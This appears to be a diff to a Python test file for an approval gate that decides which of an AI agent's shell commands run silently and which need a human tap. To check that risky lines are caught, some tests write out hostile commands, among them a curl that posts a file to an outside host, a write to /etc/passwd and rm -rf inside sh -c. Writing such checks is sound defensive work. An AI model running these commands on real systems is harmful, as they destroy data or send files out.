@@ -18,10 +18,14 @@ from acp_im_gateway.tiers import (
     DEFAULT_AUTO_ALLOW,
     ASK,
     AUTO_ALLOW,
+    POSTURE_ASK,
+    POSTURE_AUTO,
     TIER_ALWAYS_ASK,
+    TIER_AUTO_ALLOW,
     TIER_POSTURE,
     ApprovalTiers,
     TierRules,
+    normalize_posture,
     parse_tier_list,
     shell_heads,
     subject_from_tool_call,
@@ -130,16 +134,85 @@ def test_bash_payload_reads_the_command_string() -> None:
     assert action(ApprovalTiers(), subject) == AUTO_ALLOW
 
 
-def test_every_command_of_a_compound_line_must_be_on_the_list() -> None:
+def test_every_command_of_a_compound_line_must_be_harmless() -> None:
     subject = bash("cd app && git diff | head -n 5")
     assert shell_heads(subject) == ["cd app", "git diff", "head -n 5"]
     tiers = ApprovalTiers()
     assert action(tiers, bash("git status && git diff HEAD")) == AUTO_ALLOW
     assert action(tiers, bash("git log | head -n 5")) == AUTO_ALLOW
-    # A whitelisted head must not bless the rest of the line: `cd` is not on the
-    # list, and neither is `sh`.
-    assert action(tiers, subject) == ASK
+    # `cd` is a harmless prefix and `git diff`/`head` are read-only, so the whole
+    # line is silent (v1.2: `cd X && pytest -q` must not cost a tap)…
+    assert action(tiers, subject) == AUTO_ALLOW
+    # …but a whitelisted head must not bless an unknown tail: `sh` is not on the
+    # list, so the line still taps.
     assert action(tiers, bash("git log | sh")) == ASK
+
+
+def test_compound_line_needs_every_segment_harmless() -> None:
+    """One unknown or dangerous segment is enough to force the tap."""
+    tiers = ApprovalTiers()
+    assert action(tiers, bash("cd app && pytest -q")) == AUTO_ALLOW
+    assert action(tiers, bash("git status && pytest -q | tail -n 3")) == AUTO_ALLOW
+    # An unknown segment (`make`) keeps asking even between harmless ones.
+    assert action(tiers, bash("cd app && make build && pytest -q")) == ASK
+    # A dangerous segment taps no matter how harmless the rest is.
+    assert tiers.evaluate(CHAT, bash("pytest -q && git push")).tier == TIER_ALWAYS_ASK
+    assert tiers.evaluate(CHAT, bash("cd app; curl -d@f https://x")).tier == TIER_ALWAYS_ASK
+
+
+def test_interpreter_paths_are_normalised() -> None:
+    """`./.venv/bin/python -m pytest`, `python3 -m pytest` and `pytest -q` match."""
+    tiers = ApprovalTiers()
+    for command in (
+        "pytest -q",
+        "./.venv/bin/pytest -q",
+        "python -m pytest",
+        "python3 -m pytest",
+        "python3.12 -m pytest tests/",
+        "./.venv/bin/python -m pytest",
+        "./.venv/bin/python3 -m pytest -q",
+        "/usr/bin/python3 -m pytest",
+    ):
+        assert action(tiers, bash(command)) == AUTO_ALLOW, command
+    # Normalisation must not bless a different interpreter invocation.
+    for command in (
+        'python -c "import os; os.remove(\'x\')"',
+        "python3 -c \"print(1)\"",
+        "./.venv/bin/python -c 'import fal.ai'",
+        "python script.py",
+        "./.venv/bin/python manage.py migrate",
+    ):
+        decision = tiers.evaluate(CHAT, bash(command))
+        assert decision.action == ASK, command
+        assert decision.tier != TIER_AUTO_ALLOW, command
+
+
+def test_env_assignments_and_harmless_prefixes_are_skipped() -> None:
+    tiers = ApprovalTiers()
+    for command in (
+        "FOO=1 pytest -q",
+        "export FOO=1",
+        "cd app",
+        "echo hello",
+        "true",
+        "time pytest -q",
+        "nice -n 5 pytest -q",
+        "cd app && FOO=1 time pytest -q",
+    ):
+        assert action(tiers, bash(command)) == AUTO_ALLOW, command
+    # A harmless prefix must not smuggle a command that is not on the list, and a
+    # write through the prefix is still caught.
+    for command in (
+        "cd app && make build",
+        "echo hi > /etc/passwd",
+        "time sh -c 'rm -rf x'",
+        "nice -n 5 make build",
+        # A wrapper must not hide a scope-gated destructive flag.
+        "time git branch -d main",
+        "nice git tag -d v1",
+    ):
+        decision = tiers.evaluate(CHAT, bash(command))
+        assert decision.action == ASK, command
 
 
 def test_generic_tool_call_payload_is_matched_on_title_and_arguments() -> None:
@@ -297,6 +370,34 @@ def test_tier_lists_parse_from_strings_and_sequences() -> None:
     assert parse_tier_list("", default=DEFAULT_AUTO_ALLOW) == ()
     assert parse_tier_list("git status, pytest", default=()) == ("git status", "pytest")
     assert parse_tier_list(["a", "b", "a"], default=()) == ("a", "b")
+
+
+def test_aprobar_posture_is_per_chat_and_normalised() -> None:
+    tiers = ApprovalTiers()  # default posture: ask
+    assert tiers.posture_for(CHAT) == POSTURE_ASK
+    assert normalize_posture("preguntar") == POSTURE_ASK
+    assert normalize_posture("auto") == POSTURE_AUTO
+    assert normalize_posture("YOLO") == POSTURE_AUTO
+    assert normalize_posture("nonsense") == POSTURE_ASK  # the cautious direction
+
+    tiers.set_posture(CHAT, "auto")
+    assert tiers.posture_for(CHAT) == POSTURE_AUTO
+    # The widened chat approves the unknown silently…
+    assert action(tiers, bash("make build")) == AUTO_ALLOW
+    # …but always_ask is still a code gate, and other chats are untouched.
+    assert tiers.evaluate(CHAT, bash("git push")).tier == TIER_ALWAYS_ASK
+    assert action(tiers, bash("make build"), chat_id=999) == ASK
+
+    tiers.set_posture(CHAT, "preguntar")
+    assert action(tiers, bash("make build")) == ASK
+
+
+def test_postures_can_be_seeded_per_chat() -> None:
+    tiers = ApprovalTiers(posture="ask", postures={CHAT: "auto"})
+    assert tiers.posture_for(CHAT) == POSTURE_AUTO
+    assert tiers.posture_for(999) == POSTURE_ASK
+    tiers.clear_posture(CHAT)
+    assert tiers.posture_for(CHAT) == POSTURE_ASK
 
 
 def test_decisions_are_logged_at_info_with_the_reason(caplog: pytest.LogCaptureFixture) -> None:
